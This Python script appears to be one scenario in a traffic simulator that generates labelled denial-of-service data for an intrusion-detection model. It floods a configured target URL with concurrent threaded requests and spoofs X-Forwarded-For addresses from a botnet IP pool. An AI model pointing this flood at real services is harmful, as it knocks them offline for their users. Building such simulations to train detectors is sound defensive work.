"""DoS / DDoS flood.

Hammers a single endpoint with high concurrency from a botnet IP pool. Produces
very high count / srv_count / same_srv_rate (and serrors once the origin
saturates) in the sensor.

Signature -> model class: DoS
"""

import random
import time
from concurrent.futures import ThreadPoolExecutor

import requests

from config import (
    ATTACKER_IPS,
    FLOOD_REQUESTS_PER_BATCH,
    FLOOD_WORKERS,
    REQUEST_TIMEOUT,
    TARGET_URL,
)

# All firepower on one target path -> same_srv_rate ~ 1.0 (flood signature).
FLOOD_PATH = "/browse"


def _hit():
    try:
        headers = {
            "X-Forwarded-For": random.choice(ATTACKER_IPS),
            "X-Sim-Scenario": "flood",  # ground-truth tag (not a model feature)
            "User-Agent": "Go-http-client/1.1",
            "Connection": "keep-alive",
        }
        requests.get(f"{TARGET_URL}{FLOOD_PATH}", headers=headers, timeout=REQUEST_TIMEOUT)
    except Exception:
        pass  # timeouts are expected under flood -> shows up as serrors


def run(stop=None):
    """Loop until `stop` (a threading.Event) is set, or forever if None."""
    print(f"[flood] DoS flood on {TARGET_URL}{FLOOD_PATH} "
          f"({FLOOD_WORKERS} workers x {FLOOD_REQUESTS_PER_BATCH}/batch)")
    batch = 0
    while not (stop and stop.is_set()):
        with ThreadPoolExecutor(max_workers=FLOOD_WORKERS) as ex:
            for _ in range(FLOOD_REQUESTS_PER_BATCH):
                ex.submit(_hit)
        batch += 1
        print(f"[flood] sent batch #{batch} ({FLOOD_REQUESTS_PER_BATCH} reqs)")
        time.sleep(0.2)


if __name__ == "__main__":
    run()
